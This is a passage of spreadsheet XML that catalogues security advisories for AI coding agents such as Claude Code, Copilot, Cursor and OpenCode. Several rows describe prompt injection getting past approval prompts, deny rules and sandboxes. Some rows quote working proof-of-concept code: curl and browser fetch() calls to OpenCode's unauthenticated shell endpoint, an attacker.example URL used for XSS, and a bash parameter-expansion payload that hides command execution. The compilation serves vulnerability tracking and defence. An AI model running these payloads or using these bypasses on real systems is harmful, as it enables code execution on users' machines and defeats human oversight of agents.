          <t>Due to errors in parsing shell commands related to $IFS and short CLI flags, it was possible to bypass the Claude Code read-only validation and trigger arbitrary code execution. Reliably exploiting this requires the ability to add untrusted content into a Claude Code context window.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Thank you to [RyotaK](hxxps://ryotak.net) from [GMO Flatt Security Inc.](hxxps://flatt.tech/en/) for reporting this issue!</t>
        </is>
      </c>
      <c r="H84" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-xq4m-mc3c-vvg3</t>
        </is>
      </c>
    </row>
    <row r="85">
      <c r="A85" s="8" t="inlineStr">
        <is>
          <t>CA-068</t>
        </is>
      </c>
      <c r="B85" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C85" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D85" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E85" s="8" t="inlineStr">
        <is>
          <t>2025-12-09</t>
        </is>
      </c>
      <c r="F85" s="9" t="inlineStr">
        <is>
          <t>GitHub Copilot for Jetbrains Remote Code Execution Vulnerability</t>
        </is>
      </c>
      <c r="G85" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in Copilot allows an unauthorized attacker to execute code locally.</t>
        </is>
      </c>
      <c r="H85" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-64671</t>
        </is>
      </c>
    </row>
    <row r="86">
      <c r="A86" s="8" t="inlineStr">
        <is>
          <t>CA-069</t>
        </is>
      </c>
      <c r="B86" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C86" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D86" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E86" s="8" t="inlineStr">
        <is>
          <t>2026-01-09</t>
        </is>
      </c>
      <c r="F86" s="9" t="n"/>
      <c r="G86" s="9" t="inlineStr">
        <is>
          <t>Processing specially crafted workspace folder names could allow for arbitrary command injection in the Kiro GitLab Merge-Request helper in Kiro IDE before version 0.6.18 when opening maliciously crafted workspaces.  To mitigate, users should update to version 0.6.18.</t>
        </is>
      </c>
      <c r="H86" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7xjv-wf6r-872r</t>
        </is>
      </c>
    </row>
    <row r="87">
      <c r="A87" s="8" t="inlineStr">
        <is>
          <t>CA-070</t>
        </is>
      </c>
      <c r="B87" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C87" s="8" t="inlineStr">
        <is>
          <t>OpenCode</t>
        </is>
      </c>
      <c r="D87" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E87" s="8" t="inlineStr">
        <is>
          <t>2026-01-13</t>
        </is>
      </c>
      <c r="F87" s="9" t="inlineStr">
        <is>
          <t>OpenCode's Unauthenticated HTTP Server Allows Arbitrary Command Execution</t>
        </is>
      </c>
      <c r="G87" s="9" t="inlineStr">
        <is>
          <t>*Previously reported via email to support@sst.dev on 2025-11-17 per the security policy in [opencode-sdk-js/SECURITY.md](https://github.com/sst/opencode-sdk-js/blob/main/SECURITY.md). No response received.*  ### Summary  OpenCode automatically starts an unauthenticated HTTP server that allows any local process—or any website via permissive CORS—to execute arbitrary shell commands with the user's privileges.  ### Details  When OpenCode starts, it spawns an HTTP server (default port 4096+) with no authentication. Critical endpoints exposed:  - `POST /session/:id/shell` - Execute shell commands (`server.ts:1401`) - `POST /pty` - Create interactive terminal sessions (`server.ts:267`) - `GET /file/content?path=` - Read arbitrary files (`server.ts:1868`)  The server is started automatically in `cli/cmd/tui/worker.ts:36` via `Server.listen()`.  No authentication middleware exists in `server/server.ts`. The server uses permissive CORS (`.use(cors())` with default `Access-Control-Allow-Origin: *`), enabling browser-based exploitation.  ### PoC  **Local exploitation:**  ```bash API="http://127.0.0.1:4096"  # update with actual port SESSION_ID=$(curl -s -X POST "$API/session" -H "Content-Type: application/json" -d '{}' | jq -r '.id') curl -s -X POST "$API/session/$SESSION_ID/shell" -H "Content-Type: application/json" \   -d '{"agent": "build", "command": "echo PWNED &gt; /tmp/pwned.txt"}' cat /tmp/pwned.txt  # outputs: PWNED ```  **Browser-based exploitation:**  A malicious website can exploit visitors who have OpenCode running. Confirmed working in Firefox. PoC available upon request.  ```javascript // Malicious website JavaScript fetch('http://127.0.0.1:4096/session', {   method: 'POST',   headers: {'Content-Type': 'application/json'},   body: '{}' }) .then(r =&gt; r.json()) .then(session =&gt; {   fetch(`http://127.0.0.1:4096/session/${session.id}/shell`, {     method: 'POST',     headers: {'Content-Type': 'application/json'},     body: JSON.stringify({agent: 'build', command: 'id &gt; /tmp/pwned.txt'})   }); }); ```  Note: Chrome 142+ may prompt for Local Network Access permission. Firefox does not.  ### Impact  **Remote Code Execution** via two vectors:  1. **Local process**: Any malicious npm package, script, or compromised application can execute commands as the user running OpenCode.  2. **Browser-based (confirmed in Firefox)**: Any website can execute commands on visitors who have OpenCode running. This enables drive-by attacks via malicious ads, compromised websites, or phishing pages.  With `--mdns` flag, the server binds to `0.0.0.0` and advertises via Bonjour, extending the attack surface to the entire local network.  *Code analysis, CVSS scoring, and documentation assisted by Claude AI (Opus 4.5). Vulnerability verification and PoC testing performed by the reporter.*</t>
        </is>
      </c>
      <c r="H87" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-vxw4-wv6m-9hhh</t>
        </is>
      </c>
    </row>
    <row r="88">
      <c r="A88" s="8" t="inlineStr">
        <is>
          <t>CA-071</t>
        </is>
      </c>
      <c r="B88" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C88" s="8" t="inlineStr">
        <is>
          <t>OpenCode</t>
        </is>
      </c>
      <c r="D88" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E88" s="8" t="inlineStr">
        <is>
          <t>2026-01-13</t>
        </is>
      </c>
      <c r="F88" s="9" t="inlineStr">
        <is>
          <t>Malicious website can execute commands on the local system through XSS in the OpenCode web UI</t>
        </is>
      </c>
      <c r="G88" s="9" t="inlineStr">
        <is>
          <t>### Summary A malicious website can abuse the server URL override feature of the OpenCode web UI to achieve cross-site scripting on `http://localhost:4096`. From there, it is possible to run arbitrary commands on the local system using the `/pty/` endpoints provided by the OpenCode API.  ### Code execution via OpenCode API  - The OpenCode API has `/pty/` endpoints that allow spawning arbitrary processes on the local machine. - When you run `opencode` in your terminal, OpenCode automatically starts an HTTP server on `localhost:4096` that exposes the API along with a web interface. - JavaScript can make arbitrary same-origin `fetch()` requests to the `/pty/` API endpoints. Therefore, JavaScript execution on `http://localhost:4096` gets you code execution on local the machine.  ### JavaScript execution on localhost:4096     The markdown renderer used for LLM responses will insert arbitrary HTML into the DOM. There is no sanitization with DOMPurify or even a CSP on the web interface to prevent JavaScript execution via HTML injection.  This means controlling the LLM response for a chat session gets you JavaScript execution on the `http://localhost:4096` origin. This alone would not be enough for a 1-click exploit, but there's functionality in `packages/app/src/app.tsx` to allow specifying a custom server URL in a `?url=...` parameter:  ```javascript // packages/app/src/app.tsx const defaultServerUrl = iife(() =&gt; {   const param = new URLSearchParams(document.location.search).get("url")   if (param) return param      // [truncated]      return window.location.origin }) ```  Using this custom server URL functionality, you can make the web UI connect to and load chat sessions from an OpenCode instance on another URL. For example, tricking a user into opening http://localhost:4096/Lw/session/ses_45d2d9723ffeHN2DLrTYMz4mHn?url=https://opencode.attacker.example in their browser would load and display `ses_45d2d9723ffeHN2DLrTYMz4mHn` from the attacker-controlled server at https://opencode.attacker.example.  ### Note on exploitability  Because the localhost web UI proxies static resources from a remote location, the OpenCode team was able to prevent exploitation of this issue by making a server-side change to no longer respect the `?url=` parameter. This means the specific vulnerability used to achieve XSS on the localhost web UI no longer works as of `Fri, 09 Jan 2026 21:36:31 GMT`. Users are still strongly encouraged to upgrade to version 1.1.10 or later, as this disables the web UI/OpenCode API to reduce the attack surface of the application. Any future XSS vulnerabilities in the web UI would still impact users on OpenCode versions before 1.10.0.   ### Proof of Concept  A simple way to serve a malicious chat session is by setting up mitmproxy in front of a real OpenCode instance. This is necessary because the OpenCode web UI must load a bunch of resources before it loads and displays the chat session.  1. Spawn an OpenCode instance in a Docker container  `</t>
        </is>
      </c>
      <c r="H88" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-c83v-7274-4vgp</t>
        </is>
      </c>
    </row>
    <row r="89">
      <c r="A89" s="8" t="inlineStr">
        <is>
          <t>CA-072</t>
        </is>
      </c>
      <c r="B89" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C89" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D89" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E89" s="8" t="inlineStr">
        <is>
          <t>2026-01-14</t>
        </is>
      </c>
      <c r="F89" s="9" t="inlineStr">
        <is>
          <t>Cursor has a Terminal Tool Allowlist Bypass via Environment Variables</t>
        </is>
      </c>
      <c r="G89" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to 2.3, hen the Cursor Agent is running in Auto-Run Mode with Allowlist mode enabled, certain shell built-ins can still be executed without appearing in the allowlist and without requiring user approval. This allows an attacker via indirect or direct prompt injection to poison the shell environment by setting, modifying, or removing environment variables that influence trusted commands. This vulnerability is fixed in 2.3.</t>
        </is>
      </c>
      <c r="H89" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-22708</t>
        </is>
      </c>
    </row>
    <row r="90">
      <c r="A90" s="8" t="inlineStr">
        <is>
          <t>CA-073</t>
        </is>
      </c>
      <c r="B90" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C90" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D90" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E90" s="8" t="inlineStr">
        <is>
          <t>2026-01-21</t>
        </is>
      </c>
      <c r="F90" s="9" t="inlineStr">
        <is>
          <t>Claude Code Leaks Data via Malicious Environment Configuration Before Trust Confirmation</t>
        </is>
      </c>
      <c r="G90" s="9" t="inlineStr">
        <is>
          <t>A vulnerability in Claude Code's project-load flow allowed malicious repositories to exfiltrate data including Anthropic API keys before users confirmed trust. If a user started Claude Code in an attacker-controller repository, and the repository included a settings file that set ANTHROPIC_BASE_URL to an attacker-controlled endpoint, Claude Code would issue API requests before showing the trust prompt, including potentially leaking the user's API keys.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.</t>
        </is>
      </c>
      <c r="H90" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-jh7p-qr78-84p7</t>
        </is>
      </c>
    </row>
    <row r="91">
      <c r="A91" s="8" t="inlineStr">
        <is>
          <t>CA-074</t>
        </is>
      </c>
      <c r="B91" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C91" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D91" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E91" s="8" t="inlineStr">
        <is>
          <t>2026-02-03</t>
        </is>
      </c>
      <c r="F91" s="9" t="inlineStr">
        <is>
          <t>Claude Code has a Domain Validation Bypass which Allows Automatic Requests to Attacker-Controlled Domains</t>
        </is>
      </c>
      <c r="G91" s="9" t="inlineStr">
        <is>
          <t>Claude Code contained insufficient URL validation in its trusted domain verification mechanism for WebFetch requests. The application used a `startsWith()` function to validate trusted domains (e.g., `docs.python.org`, `modelcontextprotocol.io`), this could have enabled attackers to register domains like `modelcontextprotocol.io.example.com` that would pass validation. This could enable automatic requests to attacker-controlled domains without user consent, potentially leading to data exfiltration.   Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Thank you to hackerone.com/47sid-praetorian for reporting this issue!</t>
        </is>
      </c>
      <c r="H91" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-vhw5-3g5m-8ggf</t>
        </is>
      </c>
    </row>
    <row r="92">
      <c r="A92" s="8" t="inlineStr">
        <is>
          <t>CA-075</t>
        </is>
      </c>
      <c r="B92" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C92" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D92" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E92" s="8" t="inlineStr">
        <is>
          <t>2026-02-03</t>
        </is>
      </c>
      <c r="F92" s="9" t="inlineStr">
        <is>
          <t>Claude Code has a Path Restriction Bypass via ZSH Clobber which Allows Arbitrary File Writes</t>
        </is>
      </c>
      <c r="G92" s="9" t="inlineStr">
        <is>
          <t>Due to a Bash command validation flaw in parsing ZSH clobber syntax, it was possible to bypass directory restrictions and write files outside the current working directory without user permission prompts. Exploiting this required the user to use ZSH and the ability to add untrusted content into a Claude Code context window.   Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Claude Code thanks https://hackerone.com/alexbernier for reporting this issue!</t>
        </is>
      </c>
      <c r="H92" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-q728-gf8j-w49r</t>
        </is>
      </c>
    </row>
    <row r="93">
      <c r="A93" s="8" t="inlineStr">
        <is>
          <t>CA-076</t>
        </is>
      </c>
      <c r="B93" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C93" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D93" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E93" s="8" t="inlineStr">
        <is>
          <t>2026-02-03</t>
        </is>
      </c>
      <c r="F93" s="9" t="inlineStr">
        <is>
          <t>Claude Code has a Command Injection in find Command Bypasses User Approval Prompt</t>
        </is>
      </c>
      <c r="G93" s="9" t="inlineStr">
        <is>
          <t>Due to an error in command parsing, it was possible to bypass the Claude Code confirmation prompt to trigger execution of untrusted commands through the find command. Reliably exploiting this required the ability to add untrusted content into a Claude Code context window.   Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Claude Code thanks https://hackerone.com/alexbernier for reporting this issue!</t>
        </is>
      </c>
      <c r="H93" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-qgqw-h4xq-7w8w</t>
        </is>
      </c>
    </row>
    <row r="94">
      <c r="A94" s="8" t="inlineStr">
        <is>
          <t>CA-077</t>
        </is>
      </c>
      <c r="B94" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C94" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D94" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E94" s="8" t="inlineStr">
        <is>
          <t>2026-02-06</t>
        </is>
      </c>
      <c r="F94" s="9" t="inlineStr">
        <is>
          <t>Claude Code Vulnerable to Command Injection via Directory Change Bypasses Write Protection</t>
        </is>
      </c>
      <c r="G94" s="9" t="inlineStr">
        <is>
          <t>Claude Code failed to properly validate directory changes when combined with write operations to protected folders. By using the `cd` command to navigate into sensitive directories like `.claude`, it was possible to bypass write protection and create or modify files without user confirmation. Reliably exploiting this required the ability to add untrusted content into a Claude Code context window.   Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.  About Claude Code thanks hackerone.com/nil221 for reporting this issue!</t>
        </is>
      </c>
      <c r="H94" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-66q4-vfjg-2qhh</t>
        </is>
      </c>
    </row>
    <row r="95">
      <c r="A95" s="8" t="inlineStr">
        <is>
          <t>CA-078</t>
        </is>
      </c>
      <c r="B95" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C95" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D95" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E95" s="8" t="inlineStr">
        <is>
          <t>2026-02-06</t>
        </is>
      </c>
      <c r="F95" s="9" t="inlineStr">
        <is>
          <t>Claude Code Vulnerable to Command Injection via Piped sed Command Bypasses File Write Restrictions</t>
        </is>
      </c>
      <c r="G95" s="9" t="inlineStr">
        <is>
          <t>Claude Code failed to properly validate commands using piped sed operations with the echo command, allowing attackers to bypass file write restrictions. This vulnerability enabled writing to sensitive directories like the .claude folder and paths outside the project scope. Exploiting this required the ability to execute commands through Claude Code with the "accept edits" feature enabled.   Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.  Claude Code thanks hackerone.com/nil221 for reporting this issue!</t>
        </is>
      </c>
      <c r="H95" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-mhg7-666j-cqg4</t>
        </is>
      </c>
    </row>
    <row r="96">
      <c r="A96" s="8" t="inlineStr">
        <is>
          <t>CA-079</t>
        </is>
      </c>
      <c r="B96" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C96" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D96" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E96" s="8" t="inlineStr">
        <is>
          <t>2026-02-06</t>
        </is>
      </c>
      <c r="F96" s="9" t="inlineStr">
        <is>
          <t>Claude Code has Permission Deny Bypass Through Symbolic Links</t>
        </is>
      </c>
      <c r="G96" s="9" t="inlineStr">
        <is>
          <t>Claude Code failed to strictly enforce deny rules configured in settings.json when accessing files through symbolic links. If a user explicitly denied Claude Code access to a file (such as /etc/passwd) and Claude Code had access to a symbolic link pointing to that file, it was possible for Claude Code to read the restricted file through the symlink without triggering deny rule enforcement.   Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.  Claude Code thanks https://hackerone.com/ofirh for reporting this issue.</t>
        </is>
      </c>
      <c r="H96" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-4q92-rfm6-2cqx</t>
        </is>
      </c>
    </row>
    <row r="97">
      <c r="A97" s="8" t="inlineStr">
        <is>
          <t>CA-080</t>
        </is>
      </c>
      <c r="B97" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C97" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D97" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E97" s="8" t="inlineStr">
        <is>
          <t>2026-02-06</t>
        </is>
      </c>
      <c r="F97" s="9" t="inlineStr">
        <is>
          <t>Claude Code has Sandbox Escape via Persistent Configuration Injection in settings.json</t>
        </is>
      </c>
      <c r="G97" s="9" t="inlineStr">
        <is>
          <t>Claude Code's bubblewrap sandboxing mechanism failed to properly protect the .claude/settings.json configuration file when it did not exist at startup. While the parent directory was mounted as writable and .claude/settings.local.json was explicitly protected with read-only constraints, settings.json was not protected if it was missing. This allowed malicious code running inside the sandbox to create this file and inject persistent hooks (such as SessionStart commands) that would execute with host privileges when Claude Code was restarted.   Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.  Claude Code thanks hackerone.com/edbr for reporting this issue!</t>
        </is>
      </c>
      <c r="H97" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-ff64-7w26-62rf</t>
        </is>
      </c>
    </row>
    <row r="98">
      <c r="A98" s="8" t="inlineStr">
        <is>
          <t>CA-081</t>
        </is>
      </c>
      <c r="B98" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C98" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D98" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E98" s="8" t="inlineStr">
        <is>
          <t>2026-02-10</t>
        </is>
      </c>
      <c r="F98" s="9" t="n"/>
      <c r="G98" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in GitHub Copilot and Visual Studio allows an unauthorized attacker to execute code over a network.</t>
        </is>
      </c>
      <c r="H98" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-wr95-24gv-jx75</t>
        </is>
      </c>
    </row>
    <row r="99">
      <c r="A99" s="8" t="inlineStr">
        <is>
          <t>CA-082</t>
        </is>
      </c>
      <c r="B99" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C99" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D99" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E99" s="8" t="inlineStr">
        <is>
          <t>2026-02-10</t>
        </is>
      </c>
      <c r="F99" s="9" t="n"/>
      <c r="G99" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in GitHub Copilot and Visual Studio allows an authorized attacker to elevate privileges over a network.</t>
        </is>
      </c>
      <c r="H99" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-g435-352v-fpxp</t>
        </is>
      </c>
    </row>
    <row r="100">
      <c r="A100" s="8" t="inlineStr">
        <is>
          <t>CA-083</t>
        </is>
      </c>
      <c r="B100" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C100" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D100" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E100" s="8" t="inlineStr">
        <is>
          <t>2026-02-10</t>
        </is>
      </c>
      <c r="F100" s="9" t="n"/>
      <c r="G100" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in Github Copilot allows an unauthorized attacker to execute code over a network.</t>
        </is>
      </c>
      <c r="H100" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-mjvv-wfm9-3vm3</t>
        </is>
      </c>
    </row>
    <row r="101">
      <c r="A101" s="8" t="inlineStr">
        <is>
          <t>CA-084</t>
        </is>
      </c>
      <c r="B101" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C101" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D101" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E101" s="8" t="inlineStr">
        <is>
          <t>2026-02-10</t>
        </is>
      </c>
      <c r="F101" s="9" t="inlineStr">
        <is>
          <t>GitHub Copilot and Visual Studio Code Security Feature Bypass Vulnerability</t>
        </is>
      </c>
      <c r="G101" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in GitHub Copilot and Visual Studio Code allows an unauthorized attacker to bypass a security feature over a network.</t>
        </is>
      </c>
      <c r="H101" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-21518</t>
        </is>
      </c>
    </row>
    <row r="102">
      <c r="A102" s="8" t="inlineStr">
        <is>
          <t>CA-086</t>
        </is>
      </c>
      <c r="B102" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C102" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D102" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E102" s="8" t="inlineStr">
        <is>
          <t>2026-02-13</t>
        </is>
      </c>
      <c r="F102" s="9" t="inlineStr">
        <is>
          <t>Cursor sandbox escape via Git hooks</t>
        </is>
      </c>
      <c r="G102" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Sandbox escape via writing .git configuration was possible in versions prior to 2.5. A malicious agent (ie prompt injection) could write to improperly protected .git settings, including git hooks, which may cause out-of-sandbox RCE next time they are triggered. No user interaction was required as Git executes these commands automatically. Fixed in version 2.5.</t>
        </is>
      </c>
      <c r="H102" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-26268</t>
        </is>
      </c>
    </row>
    <row r="103">
      <c r="A103" s="8" t="inlineStr">
        <is>
          <t>CA-087</t>
        </is>
      </c>
      <c r="B103" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C103" s="8" t="inlineStr">
        <is>
          <t>Cline</t>
        </is>
      </c>
      <c r="D103" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E103" s="8" t="inlineStr">
        <is>
          <t>2026-02-19</t>
        </is>
      </c>
      <c r="F103" s="9" t="inlineStr">
        <is>
          <t>Unauthorized npm publish of cline@2.3.0 with modified postinstall script</t>
        </is>
      </c>
      <c r="G103" s="9" t="inlineStr">
        <is>
          <t>### Description On February 17, 2026 at 3:26 AM PT, an unauthorized party used a compromised npm publish token to publish an update to Cline CLI on the NPM registry: cline@2.3.0. The published package contains a modified package.json with an added postinstall script: `"postinstall": "npm install -g openclaw@latest"` This causes openclaw (an unrelated, non-malicious open source package) to be globally installed when cline@2.3.0 is installed. No other files were modified -- the CLI binary (dist/cli.mjs) and all other package contents are identical to the legitimate cline@2.2.3 release. A corrected version (2.4.0) was published at 11:23 AM PT and 2.3.0 was deprecated at 11:30 AM PT. The compromised token has been revoked and npm publishing now uses OIDC provenance via GitHub Actions.  ### Impact Users who installed Cline CLI cline@2.3.0 during the approximately 8-hour window between 3:26 AM PT and 11:30 AM PT on February 17 will have openclaw globally installed. The openclaw package is a legitimate open source project and is not malicious, but its installation was not authorized or intended.  The Cline VS Code extension and JetBrains plugin were not affected. This advisory applies only to the Cline CLI package published on npm.  ### Patches Versions 2.4.0 and higher are fixed  ### Workarounds If you installed Cline CLI cline@2.3.0: 1. Update to the latest version of the Cline CLI `cline update` or `npm installl -g cline@latest` 2. Verify that you have a fixed version (2.4.0 or higher) `cline --version` 3. Review your environment for any unexpected installation of OpenClaw and remove it if not intended `npm uninstall -g openclaw`</t>
        </is>
      </c>
      <c r="H103" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-9ppg-jx86-fqw7</t>
        </is>
      </c>
    </row>
    <row r="104">
      <c r="A104" s="8" t="inlineStr">
        <is>
          <t>CA-089</t>
        </is>
      </c>
      <c r="B104" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C104" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D104" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E104" s="8" t="inlineStr">
        <is>
          <t>2026-03-06</t>
        </is>
      </c>
      <c r="F104" s="9" t="inlineStr">
        <is>
          <t>GitHub Copilot CLI Dangerous Shell Expansion Patterns Enable Arbitrary Code Execution</t>
        </is>
      </c>
      <c r="G104" s="9" t="inlineStr">
        <is>
          <t>## Summary  A security vulnerability has been identified in GitHub Copilot CLI's shell tool that could allow arbitrary code execution through crafted bash parameter expansion patterns. An attacker who can influence the commands executed by the agent (e.g., via prompt injection through repository files, MCP server responses, or user instructions) can exploit bash parameter transformation operators to execute hidden commands, bypassing the safety assessment that classifies commands as "read-only."  ## Details  The vulnerability stems from how the CLI's shell safety assessment evaluates commands before execution. The safety layer parses and classifies shell commands as either read-only (safe) or write-capable (requires user approval). However, several bash parameter expansion features can embed executable code within arguments to otherwise read-only commands, causing them to appear safe while actually performing arbitrary operations.  The specific dangerous patterns are:  1. **`${var@P}` — Prompt expansion:** The `@P` parameter transformation operator evaluates its value as a prompt string, which interprets embedded command substitutions. This allows hidden command execution inside what appears to be a simple variable reference.  2. **`${var=value}` / `${var:=value}` — Assignment side-effects:** These forms assign values to variables as a side-effect of expansion. When chained with `@P`, an attacker can progressively build up a command substitution string across multiple expansions.  3. **`${!var}` — Indirect expansion:** Dereferences an arbitrary variable name, which can be combined with other patterns to construct and execute commands dynamically.  4. **Nested `$(cmd)` or `&lt;(cmd)` inside `${...}` expansions:** Command substitution or process substitution embedded within parameter expansion default values (e.g., `${HOME:-$(whoami)}`) executes the nested command.  ### Proof of Concept  The following command appears to run a harmless `echo`, but actually executes `touch /tmp/pwned` through chained parameter expansion:  ```bash echo ${a="$"}${b="$a(touch /tmp/pwned)"}${b@P} ```  **How it works:** - `${a="$"}` assigns the literal `$` character to variable `a` - `${b="$a(touch /tmp/pwned)"}` expands `$a` to `$`, constructing the string `$(touch /tmp/pwned)` and assigning it to `b` - `${b@P}` applies prompt expansion to `b`, which evaluates the embedded `$(touch /tmp/pwned)` command substitution  Prior to the fix, the safety assessment would classify `echo` as a read-only command and allow execution without user confirmation — even in modes that normally require approval for write operations.  ## Impact  An attacker who can influence command text sent to the shell tool — for example, through: - Prompt injection via malicious repository content (README files, code comments, issue bodies) - Compromised or malicious MCP server responses - Crafted user instructions containing obfuscated commands  — could achieve arbitrary code execution on the user's worksta</t>
        </is>
      </c>
      <c r="H104" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-g8r9-g2v8-jv6f</t>
        </is>
      </c>
    </row>
    <row r="105">
      <c r="A105" s="8" t="inlineStr">
